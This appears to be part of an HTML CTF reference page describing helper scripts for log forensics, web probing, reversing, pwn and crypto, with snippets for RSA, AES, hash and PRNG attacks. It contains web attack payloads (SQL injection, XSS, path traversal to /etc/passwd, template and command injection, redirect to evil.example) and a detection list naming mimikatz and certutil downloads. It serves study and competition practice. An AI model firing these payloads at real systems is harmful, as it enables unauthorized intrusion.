+    <p class="desc">For a directory that isn't EVTX logs — a bundle of challenges, or writeup/answer-key PDFs. Prints a file inventory, then <b>extracts text from each PDF (pdftotext), office docs, and <code>strings</code> on the rest</b>, grepping per file. Binary PDFs are read as text (not raw bytes), so no garbage matches.</p>
+    <div class="tags"><span>directory</span><span>pdf</span><span>bundle</span></div>
+    <div class="snip"><span class="lbl">run it</span><button class="copy">Copy</button><pre>auto_dirsweep.sh "Answer Keys_2024" CSG_FLAG
+# Cryptography/Grill_Cipher.pdf: CSG_FLAG{FleissnerGrill}
+# Steganography/steg1.pdf:       CSG_FLAG{A_picture_is_worth_@_thousand_words}
+# ... (needs poppler-utils for pdftotext; install.sh provides it)</pre></div>
+    <div class="hint"><b>Note:</b> the generic flag regex matches binary noise inside compressed PDF streams, so dirsweep reads <em>extracted text</em> instead of raw bytes. Set a <code>FLAG_PREFIX</code> (e.g. <code>CSG_FLAG</code>) to drop any remaining decoys.</div>
+  </div>
+
+  <div class="card">
+    <h3>auto_hayabusa.sh — Sigma EVTX timeline (PRIMARY forensic log check)</h3>
+    <p class="desc">Drives <b>Hayabusa</b> (Yamato-Security) over a single <code>.evtx</code> <b>or a whole directory</b>, with the rule-wizard disabled for automation, then parses the CSV and <b>prints findings by level, every CRITICAL/HIGH alert, MITRE tactics, and a logon summary</b>. Needs the hayabusa binary (release or <code>cargo build</code>); set <code>HAYABUSA=</code> or put it on PATH. Falls back to <code>auto_winlog.py</code> when absent.</p>
+    <div class="tags"><span>hayabusa</span><span>sigma</span><span>evtx</span><span>timeline</span></div>
+    <div class="snip"><span class="lbl">run it</span><button class="copy">Copy</button><pre>auto_hayabusa.sh Security.evtx        # one log
+auto_hayabusa.sh ./evtx_logs/         # whole folder of evtx
+HAYABUSA=~/tools/hayabusa/hayabusa auto_hayabusa.sh dump.evtx</pre></div>
+    <div class="snip"><span class="lbl">the scan + summary it performs (full script: automate/auto_hayabusa.sh)</span><button class="copy">Copy</button><pre># detection timeline — wizard OFF, all levels, UTC, overwrite
+hayabusa csv-timeline -f LOG.evtx -r RULES -o timeline.csv -p verbose -m informational -w -C -U
+hayabusa logon-summary -f LOG.evtx            # successful/failed logons table
+
+# then a python pass over timeline.csv prints:
+#   [=] by level:        critical/high/medium/low/informational counts
+#   [=] CRITICAL/HIGH:   rule title :: count     (what actually fired)
+#   [=] MITRE tactics:   Defense Evasion x12, Lateral Movement x3, ...
+#   [=] first crit/high: timestamp :: host :: rule
+# columns parsed from the 'verbose' profile: Timestamp,RuleTitle,Level,Computer,EventID,MitreTactics,...</pre></div>
+    <div class="hint"><b>Why Hayabusa first:</b> it carries 4k+ Sigma rules and scans a directory of logs at once with a ready timeline + per-level counts — broader than the hand-rolled rules. <code>auto_winlog.py</code> stays as the zero-dependency fallback when you have no binary (e.g. a locked-down box).</div>
+  </div>
+
+  <div class="card">
+    <h3>auto_winlog.py — DeepBlueCLI-style event-log hunt</h3>
+    <p class="desc">Replicates <b>DeepBlueCLI</b>'s detections against a <code>.evtx</code> (or XML dump) and <b>prints every match with its label</b>. Reads evtx via python-evtx / <code>evtx_dump</code>. Covers event-ID cases + the command/scriptblock regexes + count-based spray/bruteforce.</p>
+    <div class="tags"><span>evtx</span><span>DFIR</span><span>deepbluecli</span></div>
+    <div class="snip"><span class="lbl">what it flags (full script: automate/auto_winlog.py)</span><button class="copy">Copy</button><pre># EVENT-ID cases (label printed on hit):
+1102/104  Audit/System log CLEARED        4720      New user created
+4728/4732/4756  user added to group       4672      Admin / SeDebugPrivilege logon
+7045/4697 New service installed           4698      Scheduled task created
+5861      WMI event-filter persistence    4648      Explicit-cred logon (spray/lateral)
+8003/8004 AppLocker block                 Sysmon 7  Unsigned DLL loaded
+4688/4104 process + PowerShell cmdline    Sysmon 8  CreateRemoteThread
+
+# COMMAND-LINE / scriptblock regexes (DeepBlueCLI regexes.txt + extras):
+mimikatz · Invoke-Mimikatz · PowerSploit · FromBase64String+GzipStream · DownloadString http
+-EncodedCommand · -w hidden · 500+ base64 chars · csc.exe / cvtres.exe (PSAttack)
+Register-ScheduledTask / Run-key / reg add (ASEP) · ADMIN$ share · net user /add
+certutil|bitsadmin download · rundll32 javascript · vssadmin delete shadows · obfuscation
+
+# COUNT-BASED:
+4625 >=10 fails/account (bruteforce) · 4648 >=5 targets (password spray) · 4672 >=5 (admin reuse)
+
+# each hit prints:   [EID] Label :: detail      (e.g.  [1102] Security Audit Log CLEARED :: )
+# run:  auto_winlog.py Security.evtx     (or feed:  evtx_dump -o xml x.evtx > x.xml)</pre></div>
+    <div class="hint"><b>Tip:</b> on Windows you can also run the original <code>DeepBlue.ps1 -log security</code> directly; this port lets the same checks run on Kali against an exported evtx.</div>
+  </div>
+
+  <div class="card">
+    <h3>auto_web.py — recon + vuln-area classifier</h3>
+    <p class="desc">Recon (headers, leaks, JS, forms, params) then <b>actively probes every parameter</b> with one payload per PayloadsAllTheThings class and tells you <b>which area it likely is</b> — SQLi (error/time-based), XSS (reflected), LFI, SSTI (7*7=49), command-injection, open-redirect — plus a tech/area guess (auth, file-upload, JWT, GraphQL, SSRF).</p>
+    <div class="tags"><span>web</span><span>PayloadsAllTheThings</span><span>classifier</span></div>
+    <div class="snip"><span class="lbl">core logic (full script: automate/auto_web.py)</span><button class="copy">Copy</button><pre># pip install requests   —   authorized CTF/lab targets only
+SQL_ERR = re.compile(r"SQL syntax|mysqli?|ORA-\d{5}|SQLSTATE|SQLite3?::|Unclosed quotation", re.I)
+PROBES = {
+  "SQL Injection":     ["'", "\"", "1' AND SLEEP(4)-- -"],     # db error  OR  &gt;3s delay
+  "XSS":               ["&lt;svg/onload=alert(1)>zqx7"],         # marker reflected unescaped
+  "LFI":               ["../../../../etc/passwd",
+                        "php://filter/convert.base64-encode/resource=index.php"],  # root:..:0:0 / PD9waHA
+  "SSTI":              ["{{7*7}}", "${7*7}", "&lt;%= 7*7 %>"],    # response contains 49
+  "Command Injection": [";id", "|id", "`id`", "$(id)", "&amp; whoami"],  # uid=NN(
+  "Open Redirect":     ["//evil.example"],                      # Location honors attacker host
+}
+SSRF_PARAMS = {"url","uri","next","redirect","file","page","path","dest","img","src","host",...}
+
+# per GET-param / form-field:  baseline  ->  inject each payload  ->  detect + label, e.g.
+#   GET /item?id=  param 'id'  -> SQL Injection — ERROR-BASED (db error on quote)
+#   GET /p?page=   param 'page'-> LFI — CONFIRMED (payload output present)
+# AREA GUESS from signals:  password field->Auth/JWT · type=file->File Upload ·
+#   url-like param->SSRF/Redirect · /graphql,/api->GraphQL · eyJ.. cookie->JWT
+# ref: github.com/swisskyrepo/PayloadsAllTheThings  (per-area deep-dive payloads)</pre></div>
+    <div class="hint w"><b>Rate-limit safe:</b> all requests go through one throttled layer — <code>WEB_DELAY</code>s spacing (default 0.4), exponential backoff on <b>HTTP 429/503</b> honoring <code>Retry-After</code>, and a hard <code>WEB_BUDGET</code> cap (default 400) so it never floods. Getting throttled anyway? <code>WEB_DELAY=1 WEB_BUDGET=150 auto_web.py http://host/</code>. Authorized targets only.</div>
+  </div>
+
+  <div class="card">
+    <h3>auto_rev.sh — static reversing recon</h3>
+    <p class="desc">For an ELF/PE/Mach-O. <b>Never executes the target.</b> Runs file + checksec, dumps strings (ascii + wide) and greps for check/flag/password tells, detects packing/language (UPX, .NET, Go, PyInstaller) and anti-debug (ptrace), lists interesting imports/symbols (strcmp, system, main/check/verify/win…) via rabin2/nm, then flag-sweeps — and prints the manual next steps (Ghidra/ltrace/gdb/angr).</p>
+    <div class="tags"><span>reversing</span><span>static</span><span>rabin2</span></div>
+    <div class="snip"><span class="lbl">run it</span><button class="copy">Copy</button><pre>auto_rev.sh ./crackme            # or: auto_all.sh ./crackme  (runs rev + pwn)</pre></div>
+    <div class="hint w"><b>Safety:</b> auto_rev is static only. The ltrace/gdb lines it prints <em>execute</em> the binary — run those yourself only if you trust it (CTF binaries usually fine; inspect first).</div>
+  </div>
+
+  <div class="card">
+    <h3>auto_pwn.sh — pwn triage + exploit skeleton</h3>
+    <p class="desc">Prints <code>checksec</code> (NX/PIE/Canary/RELRO), finds <b>ret2win/backdoor</b> functions (win/flag/system/shell…) and <b>dangerous sinks</b> (gets/strcpy/sprintf/scanf/read…), checks for <code>/bin/sh</code> + format specifiers and a local libc, then <b>writes a ready pwntools skeleton</b> (<code>exploit_&lt;bin>.py</code>) prefilled with the binary path and the offset/gadget commands to run.</p>
+    <div class="tags"><span>pwn</span><span>checksec</span><span>pwntools</span></div>
+    <div class="snip"><span class="lbl">run it</span><button class="copy">Copy</button><pre>auto_pwn.sh ./vuln
+# -> pwn_vuln_out/exploit_vuln.py   (fill in offset + technique from checksec)
+# then:  cyclic 200 | ./vuln ; cyclic -l &lt;crash> ; ROPgadget --binary ./vuln | grep 'pop rdi'</pre></div>
+    <div class="hint"><b>Does not auto-exploit:</b> it won't run the binary — the offset/gadget commands are printed for you to run deliberately. Technique picker and full ret2libc template are in the <b>Pwn</b> tab.</div>
+  </div>
+
+  <div class="card">
+    <h3>auto_crypto.py — classify area + peel encodings &amp; RSA</h3>
+    <p class="desc">First <b>classifies the likely area</b> (JWT / RSA / hash / Base64 / classical / AES) and points to the Crypto-tab card; then recursively peels base64/32/16/85, hex, URL, ROT13, single-byte XOR until a flag surfaces. <code>--rsa n e c</code> does factordb + decrypt, falling back to RsaCtfTool / ciphey.</p>
+    <div class="tags"><span>crypto</span><span>encoding</span><span>rsa</span></div>
+    <div class="snip"><span class="lbl">automate/auto_crypto.py</span><button class="copy">Copy</button><pre>#!/usr/bin/env python3
+# auto_crypto.py "&lt;text>"  |  auto_crypto.py --rsa n e c
+import sys, re, base64, codecs, string, subprocess, shutil
+from urllib.parse import unquote_to_bytes
+FLAG = re.compile(r"[A-Za-z0-9_]{2,}\{[^}]{1,120}\}")
+
+def printable(b):
+    t = b.decode("latin-1","ignore")
+    return bool(t) and sum(c in string.printable for c in t)/len(t) > 0.9
+
+def decodes(data):
+    s = re.sub(r"\s","", data.decode("latin-1","ignore")); out = {}
+    for n,fn in (("b64",lambda x:base64.b64decode(x+"===")),("b32",lambda x:base64.b32decode(x+"======")),
+                 ("b16",lambda x:base64.b16decode(x.upper())),("b85",lambda x:base64.b85decode(x))):
+        try:
+            d=fn(s)
+            if d and printable(d): out[n]=d
+        except Exception: pass
+    try:
+        if re.fullmatch(r"[0-9a-fA-F]+",s): out["hex"]=bytes.fromhex(s)
+    except Exception: pass
+    if "%" in s: out["url"]=unquote_to_bytes(s)
+    out["rot13"]=codecs.encode(data.decode("latin-1","ignore"),"rot_13").encode()
+    for k in range(1,256):
+        x=bytes(b^k for b in data)
+        if FLAG.search(x.decode("latin-1","ignore")): out[f"xor{k:#x}"]=x; break
+    return out
+
+def recurse(data, d=0, seen=None):
+    seen=seen or set()
+    for m in FLAG.findall(data.decode("latin-1","ignore")): print("  "*d+f"[FLAG] {m}")
+    if d>=6 or data in seen: return
+    seen.add(data)
+    for n,x in decodes(data).items():
+        if x and x!=data and printable(x):
+            print("  "*d+f"-> {n}: {x[:70]!r}"); recurse(x,d+1,seen)
+
+def rsa(n,e,c):
+    import requests
+    j=requests.get(f"http://factordb.com/api?query={n}",timeout=10).json()
+    facs=[int(f) for f,_ in j["factors"]]; print("factordb:",j["status"],facs)
+    if j["status"]=="FF" and len(facs)>=2:
+        from math import prod
+        d=pow(e,-1,prod(p-1 for p in facs)); m=pow(c,d,n)
+        print("PT:",m.to_bytes((m.bit_length()+7)//8,"big")); return
+    t=shutil.which("rsactftool") or shutil.which("RsaCtfTool.py")
+    if t: subprocess.run([t,"-n",str(n),"-e",str(e),"--uncipher",str(c),"--attack","all"])
+
+def classify(t):   # name the single most-likely area
+    if t.startswith("eyJ"): return "JWT (crack HS256 / alg:none)"
+    if re.fullmatch(r"\d{40,}",t): return "RSA modulus/factor -> factordb; --rsa"
+    if re.fullmatch(r"[0-9a-fA-F]+",t) and len(t)%2==0:
+        return {32:"MD5",40:"SHA1",64:"SHA256",128:"SHA512"}.get(len(t),"hex bytes")+" (hashcat if hash)"
+    if re.fullmatch(r"[A-Za-z0-9+/]+={0,2}",t) and len(t)%4==0: return "Base64 -> decode"
+    if all(c.isalpha() or c.isspace() for c in t): return "classical cipher (dcode/quipqiup)"
+    return "unknown -> decode recursion / ciphey"
+
+args = sys.argv[1:] or input("[?] text (or: --rsa n e c): ").split()
+if args and args[0]!="--rsa": print("[=] LIKELY:", classify(args[0]))
+if len(args)>=4 and args[0]=="--rsa": rsa(int(args[1]),int(args[2]),int(args[3]))
+elif args:
+    recurse(args[0].encode())
+    if shutil.which("ciphey"): subprocess.run(["ciphey","-t",args[0],"-q"])
+else: sys.exit(__doc__)</pre></div>
+    <div class="hint w"><b>Note:</b> the tab shows a compact copy; the full, commented versions are the files in <code>./automate/</code> (already written &amp; chmod +x).</div>
+  </div>
+</section>
+
+<!-- ================================================================ ENCODING -->
+<section class="panel" data-tab="Encoding">
+  <h2>Encoding &amp; Classic Ciphers</h2>
+  <p class="lead">Peel the layers before assuming real crypto. Typical order: <b>base64 → hex → URL → ROT/Caesar → XOR → substitution</b>. If unsure, throw it at CyberChef "Magic" or <code>ciphey</code>.</p>
+
+  <div class="card">
+    <h3>Base families / hex / URL</h3>
+    <div class="tags"><span>base64</span><span>base32</span><span>base58</span><span>ascii85</span></div>
+    <div class="snip"><span class="lbl">primary</span><button class="copy">Copy</button><pre>echo "SGk=" | base64 -d
+echo "NBSWY3DP" | base32 -d
+echo "48656c6c6f" | xxd -r -p                 # hex -> bytes
+python3 -c "import base64;print(base64.b85decode('...'))"
+python3 -c "import urllib.parse,sys;print(urllib.parse.unquote(sys.argv[1]))" "%66%6c%61%67"</pre></div>
+    <div class="snip"><span class="lbl alt">alternative — auto-detect layered encoding</span><button class="copy">Copy</button><pre># CyberChef (download the offline single-page HTML): recipe = Magic, intensive
+ciphey -t "ENCODED_STRING"                     # auto-solves base/rot/xor chains</pre></div>
+  </div>
+
+  <div class="card">
+    <h3>Caesar / ROT brute (all shifts)</h3>
+    <div class="tags"><span>caesar</span><span>rot13</span><span>rot47</span></div>
+    <div class="snip"><span class="lbl">primary — python</span><button class="copy">Copy</button><pre>cipher = "euxqqhu{fdhvdu_flskhu_lv_hdvb}"
+for s in range(26):
+    out = "".join(chr((ord(c)-(65 if c.isupper() else 97)-s)%26+(65 if c.isupper() else 97))
+                   if c.isalpha() else c for c in cipher)
+    print(f"{s:2}: {out}")</pre></div>
+    <div class="snip"><span class="lbl alt">alternative — one-liners</span><button class="copy">Copy</button><pre>echo "Uryyb" | tr 'A-Za-z' 'N-ZA-Mn-za-m'      # ROT13
+echo "txt" | tr '!-~' 'P-~!-O'                   # ROT47 (all printable)</pre></div>
+  </div>
+
+  <div class="card">
+    <h3>XOR — single &amp; repeating key</h3>
+    <div class="tags"><span>xor</span><span>xortool</span><span>known-plaintext</span></div>
+    <div class="snip"><span class="lbl">primary — single-byte brute</span><button class="copy">Copy</button><pre>data = bytes.fromhex("....")
+for k in range(256):
+    o = bytes(b ^ k for b in data)
+    if b"flag" in o or b"{" in o: print(k, o)</pre></div>
+    <div class="snip"><span class="lbl alt">alternative — unknown repeating key</span><button class="copy">Copy</button><pre>xortool -x -b cipher.hex            # auto key-length + key
+xortool file.bin -c 20              # if 0x20 (space) is the most common byte
+# repeating key in python:
+from itertools import cycle
+key=b"KEY"; print(bytes(a^b for a,b in zip(data,cycle(key))))</pre></div>
+  </div>
+
+  <div class="card">
+    <h3>Substitution / Vigenère / misc</h3>
+    <div class="tags"><span>vigenere</span><span>substitution</span><span>morse</span><span>esoteric</span></div>
+    <table>
+      <tr><th>Looks like</th><th>Cipher</th><th>Solve with</th></tr>
+      <tr><td>letters only, freq matches English</td><td>monoalphabetic substitution</td><td>quipqiup.com (auto)</td></tr>
+      <tr><td>letters, key-ish pattern</td><td>Vigenère</td><td>dcode.fr Vigenère (auto key)</td></tr>
+      <tr><td><code>.- -...</code></td><td>Morse</td><td>dcode.fr Morse / CyberChef</td></tr>
+      <tr><td><code>+++[&gt;++&lt;]</code></td><td>Brainfuck</td><td>dcode.fr esoteric</td></tr>
+      <tr><td><code>Ook. Ook?</code></td><td>Ook!</td><td>dcode.fr</td></tr>
+      <tr><td>A1Z26 / numbers 1-26</td><td>letter-number</td><td>map n→chr(96+n)</td></tr>
+      <tr><td>5×5 letter pairs</td><td>Playfair / Polybius</td><td>dcode.fr</td></tr>
+    </table>
+  </div>
+</section>
+
+<!-- ================================================================ CRYPTO -->
+<section class="panel" data-tab="Crypto">
+  <h2>Crypto — a Python script for every type</h2>
+  <p class="lead">Identify <b>what's weak</b>, jump to that card, copy the script. RSA: the "wrong" parameter (tiny e, shared n/factor, close primes, small d, leaked bits) names the attack. Deps: <code>pip install pycryptodome gmpy2 sympy owiener randcrack requests</code>; lattice/DLP cards use <b>SageMath</b> (run free at sagecell.sagemath.org).</p>
+
+  <div class="card">
+    <h3>RSA — symptom → attack map</h3>
+    <div class="tags"><span>RSA</span><span>RsaCtfTool</span><span>factordb</span></div>
+    <table>
+      <tr><th>Symptom</th><th>Attack (card below)</th></tr>
+      <tr><td>you have p,q (or n on factordb)</td><td>basic decrypt / factordb</td></tr>
+      <tr><td>p and q close</td><td>Fermat</td></tr>
+      <tr><td>n-1 smooth</td><td>Pollard p−1</td></tr>
+      <tr><td>e=3 (or small), short m</td><td>cube root (low-exponent)</td></tr>
+      <tr><td>same e, e+ recipients, diff n</td><td>Håstad broadcast (CRT)</td></tr>
+      <tr><td>same n, two e (coprime), two c</td><td>common modulus</td></tr>
+      <tr><td>many keys share a prime</td><td>batch-GCD</td></tr>
+      <tr><td>very large e (≈n) / small d</td><td>Wiener</td></tr>
+      <tr><td>known high bits of p / stereotyped m</td><td>Coppersmith (sage)</td></tr>
+      <tr><td>dp = d mod (p−1) leaked</td><td>CRT-exponent leak</td></tr>
+      <tr><td>e=2</td><td>Rabin</td></tr>
+      <tr><td>oracle returns parity/LSB of m</td><td>LSB oracle</td></tr>
+    </table>
+    <div class="snip"><span class="lbl">auto — try everything at once</span><button class="copy">Copy</button><pre>rsactftool -n N -e E --uncipher C --attack all
+rsactftool --publickey key.pub --uncipherfile cipher.bin --attack all</pre></div>
+  </div>
+
+  <div class="card">
+    <h3>RSA — basic decrypt &amp; factoring</h3>
+    <div class="tags"><span>python</span><span>factordb</span><span>fermat</span><span>pollard</span></div>
+    <div class="snip"><span class="lbl">decrypt once factored (incl. multi-prime)</span><button class="copy">Copy</button><pre>from Crypto.Util.number import long_to_bytes, inverse
+from math import prod
+primes = [p, q]                       # or [p,q,r,...] for multi-prime
+n = prod(primes); phi = prod(x-1 for x in primes)
+d = inverse(e, phi)
+print(long_to_bytes(pow(c, d, n)))</pre></div>
+    <div class="snip"><span class="lbl">factordb lookup</span><button class="copy">Copy</button><pre>import requests
+r = requests.get(f"http://factordb.com/api?query={n}").json()
+print(r["status"], [int(f) for f,_ in r["factors"]])   # FF = fully factored</pre></div>
+    <div class="snip"><span class="lbl alt">Fermat (p,q close)</span><button class="copy">Copy</button><pre>from gmpy2 import isqrt
+def fermat(n):
+    a = isqrt(n) + 1
+    while True:
+        b2 = a*a - n; b = isqrt(b2)
+        if b*b == b2: return a-b, a+b
+        a += 1
+p, q = fermat(n)</pre></div>
+    <div class="snip"><span class="lbl alt">Pollard p−1 (n−1 smooth)</span><button class="copy">Copy</button><pre>from math import gcd
+def pollard_pm1(n, B=2**20):
+    a = 2
+    for j in range(2, B):
+        a = pow(a, j, n); d = gcd(a-1, n)
+        if 1 &lt; d &lt; n: return d
+p = pollard_pm1(n); q = n // p</pre></div>
+  </div>
+
+  <div class="card">
+    <h3>RSA — small / broadcast exponent</h3>
+    <div class="tags"><span>cube-root</span><span>Hastad</span><span>CRT</span></div>
+    <div class="snip"><span class="lbl">low-exponent cube root (m^e &lt; n, no padding)</span><button class="copy">Copy</button><pre>from gmpy2 import iroot
+from Crypto.Util.number import long_to_bytes
+m, exact = iroot(c, e)                 # e small, e.g. 3
+assert exact; print(long_to_bytes(int(m)))</pre></div>
+    <div class="snip"><span class="lbl alt">Håstad broadcast (same m, same e=k, k moduli)</span><button class="copy">Copy</button><pre>from sympy.ntheory.modular import crt
+from gmpy2 import iroot
+from Crypto.Util.number import long_to_bytes
+ns = [n1, n2, n3]; cs = [c1, c2, c3]   # need e ciphertexts
+C, _ = crt(ns, cs)
+m, _ = iroot(int(C), e)
+print(long_to_bytes(int(m)))</pre></div>
+  </div>
+
+  <div class="card">
+    <h3>RSA — shared modulus / shared factor</h3>
+    <div class="tags"><span>common-modulus</span><span>batch-gcd</span></div>
+    <div class="snip"><span class="lbl">common modulus (same n, e1,e2 coprime)</span><button class="copy">Copy</button><pre>from Crypto.Util.number import long_to_bytes, inverse
+def egcd(a, b):
+    if b == 0: return (a, 1, 0)
+    g, x, y = egcd(b, a % b); return (g, y, x - (a//b)*y)
+g, a, b = egcd(e1, e2)                 # g must be 1
+if a &lt; 0: c1 = inverse(c1, n); a = -a
+if b &lt; 0: c2 = inverse(c2, n); b = -b
+m = (pow(c1, a, n) * pow(c2, b, n)) % n
+print(long_to_bytes(m))</pre></div>
+    <div class="snip"><span class="lbl alt">batch-GCD (keys share a prime)</span><button class="copy">Copy</button><pre>from math import gcd
+Ns = [n1, n2, n3, ...]
+for i in range(len(Ns)):
+    for j in range(i+1, len(Ns)):
+        g = gcd(Ns[i], Ns[j])
+        if g != 1: print(f"shared prime between {i},{j}: {g}")</pre></div>
+  </div>
+
+  <div class="card">
+    <h3>RSA — Wiener (small d)</h3>
+    <div class="tags"><span>continued-fraction</span><span>owiener</span></div>
+    <div class="snip"><span class="lbl">primary</span><button class="copy">Copy</button><pre>import owiener
+from Crypto.Util.number import long_to_bytes
+d = owiener.attack(e, n)               # works when d &lt; n^0.25
+print(d, long_to_bytes(pow(c, d, n)))</pre></div>
+  </div>
+
+  <div class="card">
+    <h3>RSA — Coppersmith (SageMath)</h3>
+    <div class="tags"><span>sage</span><span>lattice</span><span>known-bits</span></div>
+    <div class="snip"><span class="lbl">known high bits of p</span><button class="copy">Copy</button><pre># SageMath
+P.&lt;x> = PolynomialRing(Zmod(n))
+f = p_high + x                         # p_high = known MSBs of p, rest zeroed
+r = f.small_roots(X=2^(unknown_bits), beta=0.4)
+p = int(p_high + r[0]); q = n // p</pre></div>
+    <div class="snip"><span class="lbl alt">stereotyped message (m = known + x)</span><button class="copy">Copy</button><pre># SageMath
+P.&lt;x> = PolynomialRing(Zmod(n))
+f = (known + x)^e - c
+f = f.monic()
+print(f.small_roots(X=2^(unknown_bits), epsilon=1/30))</pre></div>
+  </div>
+
+  <div class="card">
+    <h3>RSA — leaked dp, Rabin, LSB oracle</h3>
+    <div class="tags"><span>dp-leak</span><span>rabin</span><span>parity-oracle</span></div>
+    <div class="snip"><span class="lbl">CRT-exponent leak: dp = d mod (p−1)</span><button class="copy">Copy</button><pre>from math import gcd
+from Crypto.Util.number import long_to_bytes, inverse
+for g in range(2, 100):
+    x = pow(g, e*dp - 1, n); p = gcd(x - 1, n)
+    if 1 &lt; p &lt; n: break
+q = n // p; d = inverse(e, (p-1)*(q-1))
+print(long_to_bytes(pow(c, d, n)))</pre></div>
+    <div class="snip"><span class="lbl alt">Rabin (e=2, p≡q≡3 mod 4)</span><button class="copy">Copy</button><pre>from Crypto.Util.number import long_to_bytes, inverse
+mp = pow(c, (p+1)//4, p); mq = pow(c, (q+1)//4, q)
+yp, yq = inverse(p, q), inverse(q, p)
+for a in (mp, p-mp):
+    for b in (mq, q-mq):
+        r = (a*yq*q + b*yp*p) % (p*q)
+        print(long_to_bytes(r))        # one of the 4 roots is the flag</pre></div>
+    <div class="snip"><span class="lbl alt">LSB/parity oracle (oracle(ct)->LSB of m)</span><button class="copy">Copy</button><pre>from decimal import Decimal, getcontext
+getcontext().prec = n.bit_length() + 10
+lo, hi = Decimal(0), Decimal(n); cur = c
+for _ in range(n.bit_length()):
+    cur = (cur * pow(2, e, n)) % n     # multiply pt by 2 each step
+    if oracle(cur): lo = (lo + hi) / 2 # odd -> upper half
+    else:           hi = (lo + hi) / 2
+print(int(hi))</pre></div>
+  </div>
+
+  <div class="card">
+    <h3>AES / block ciphers — modes</h3>
+    <div class="tags"><span>ECB</span><span>CBC</span><span>CTR</span></div>
+    <div class="snip"><span class="lbl">decrypt (key+iv known) + detect ECB</span><button class="copy">Copy</button><pre>from Crypto.Cipher import AES
+from Crypto.Util.Padding import unpad
+pt = unpad(AES.new(key, AES.MODE_CBC, iv).decrypt(ct), 16)
+# ECB fingerprint: repeated 16-byte blocks
+blks = [ct[i:i+16] for i in range(0, len(ct), 16)]
+if len(blks) != len(set(blks)): print("ECB — repeated blocks present")</pre></div>
+    <div class="snip"><span class="lbl alt">CBC bit-flip (flip byte j of plaintext block i+1)</span><button class="copy">Copy</button><pre>ct = bytearray(ct)                     # or iv for block 0
+ct[16*i + j] ^= known_pt[j] ^ desired_pt[j]</pre></div>
+    <div class="snip"><span class="lbl alt">CTR / OFB nonce (keystream) reuse</span><button class="copy">Copy</button><pre># same key+nonce -> same keystream; c1^c2 = p1^p2
+ks = bytes(a ^ b for a, b in zip(c1, p1_known))
+p2 = bytes(a ^ b for a, b in zip(c2, ks))</pre></div>
+    <div class="snip"><span class="lbl alt">CBC padding oracle</span><button class="copy">Copy</button><pre># auto with a known oracle endpoint:
+padbuster http://t/dec ENCSAMPLE 16 -cookies "data=ENCSAMPLE" -encoding 0
+# or python: pip install padding-oracle-attacker  /  write oracle(ct)->bool and decrypt block-by-block</pre></div>
+  </div>
+
+  <div class="card">
+    <h3>XOR / stream ciphers</h3>
+    <div class="tags"><span>otp-reuse</span><span>crib-drag</span><span>LFSR</span><span>RC4</span></div>
+    <div class="snip"><span class="lbl">repeating-key / OTP reuse</span><button class="copy">Copy</button><pre>xortool -x -b cipher.hex            # unknown repeating key: finds length+key
+# many-time pad (same keystream reused): crib-drag known words
+# c1^c2 ^ crib  -> if readable, crib belongs there; slide it along</pre></div>
+    <div class="snip"><span class="lbl alt">LFSR — recover taps from output (Berlekamp-Massey, sage)</span><button class="copy">Copy</button><pre># SageMath
+from sage.matrix.berlekamp_massey import berlekamp_massey
+bits = [GF(2)(b) for b in output_bits]
+print(berlekamp_massey(bits))          # minimal polynomial = feedback taps</pre></div>
+    <div class="snip"><span class="lbl alt">RC4</span><button class="copy">Copy</button><pre>def rc4(key, data):
+    S = list(range(256)); j = 0
+    for i in range(256):
+        j = (j + S[i] + key[i % len(key)]) % 256; S[i], S[j] = S[j], S[i]
+    i = j = 0; out = bytearray()
+    for ch in data:
+        i = (i+1) % 256; j = (j+S[i]) % 256; S[i], S[j] = S[j], S[i]
+        out.append(ch ^ S[(S[i]+S[j]) % 256])
+    return bytes(out)</pre></div>
+  </div>
+
+  <div class="card">
+    <h3>Hashes — crack, length-extend, collide</h3>
+    <div class="tags"><span>hashcat</span><span>john</span><span>length-extension</span></div>
+    <div class="snip"><span class="lbl">identify + crack</span><button class="copy">Copy</button><pre>nth 'HASH'                             # name-that-hash (or hashid / hash-identifier)
+hashcat -m 0 hash rockyou.txt          # 0 MD5·100 SHA1·1400 SHA256·1800 sha512crypt·3200 bcrypt
+john --format=raw-md5 --wordlist=rockyou.txt hash</pre></div>
+    <div class="snip"><span class="lbl alt">length-extension forgery (MD5/SHA1/SHA2)</span><button class="copy">Copy</button><pre>import hashpumpy
+new_sig, new_msg = hashpumpy.hashpump(orig_sig, orig_data, b"&admin=1", key_len)
+# CLI: hashpump -s SIG -d "orig" -a "append" -k KEYLEN</pre></div>
+    <div class="hint"><b>Collisions:</b> MD5 chosen-prefix → <code>hashclash</code>; the two classic "same MD5, different file" PDFs/binaries are reusable. <b>HMAC timing:</b> measure per-byte compare time to recover the tag.</div>
+  </div>
+
+  <div class="card">
+    <h3>PRNG — Mersenne Twister &amp; LCG</h3>
+    <div class="tags"><span>randcrack</span><span>mt19937</span><span>lcg</span></div>
+    <div class="snip"><span class="lbl">Python random() predict (needs 624 × 32-bit outputs)</span><button class="copy">Copy</button><pre>from randcrack import RandCrack
+rc = RandCrack()
+for v in outputs_624: rc.submit(v)     # 624 consecutive getrandbits(32)
+print(rc.predict_getrandbits(32))      # next value</pre></div>
+    <div class="snip"><span class="lbl alt">LCG recover parameters from outputs</span><button class="copy">Copy</button><pre>from math import gcd
+# s_{n+1} = (a*s_n + c) mod m. With enough outputs and unknown m:
+diffs = [s1-s0 for s0,s1 in zip(outs, outs[1:])]
+zeros = [t2*t0 - t1*t1 for t0,t1,t2 in zip(diffs, diffs[1:], diffs[2:])]
+m = 0
+for z in zeros: m = gcd(m, abs(z))     # modulus
+a = (outs[2]-outs[1]) * pow(outs[1]-outs[0], -1, m) % m
+c = (outs[1] - a*outs[0]) % m
+print(m, a, c)</pre></div>
+  </div>
+
+  <div class="card">
+    <h3>ECC / ECDSA</h3>
+    <div class="tags"><span>nonce-reuse</span><span>discrete-log</span><span>sage</span></div>
+    <div class="snip"><span class="lbl">ECDSA reused nonce k (two sigs, same r)</span><button class="copy">Copy</button><pre>from Crypto.Util.number import inverse
+# sigs (r, s1,z1) and (r, s2,z2) on curve order n
+k    = (z1 - z2) * inverse(s1 - s2, n) % n
+priv = (s1 * k - z1) * inverse(r, n) % n
+print(priv)</pre></div>
+    <div class="snip"><span class="lbl alt">ECDLP on a weak/small curve (SageMath)</span><button class="copy">Copy</button><pre># SageMath
+E = EllipticCurve(GF(p), [a, b]); G = E(gx, gy); P = E(px, py)
+print(G.discrete_log(P))               # smooth order -> Pohlig-Hellman auto
+# anomalous curve (#E == p): use Smarts attack (SmartAttack scripts)</pre></div>
+  </div>
+
+  <div class="card">
+    <h3>Diffie-Hellman — discrete log</h3>
